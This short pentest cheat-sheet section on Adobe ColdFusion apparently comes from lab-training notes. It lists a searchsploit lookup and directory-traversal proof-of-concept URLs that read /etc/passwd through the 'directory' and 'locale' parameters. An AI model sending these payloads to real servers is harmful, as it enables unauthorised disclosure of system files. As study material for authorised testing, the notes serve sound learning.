## Coldfusion

- Check for CVEs

```bash
$ searchsploit adobe coldfusion
# POC potential Directory Traversal
http://$TARGET/index.cfm?directory=../../../etc/&file=passwd
http://$TARGET/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
http://$TARGET/CFIDE/administrator/settings/mappings.cfm?locale=en
```

More here : https://academy.hackthebox.com/module/113/section/2135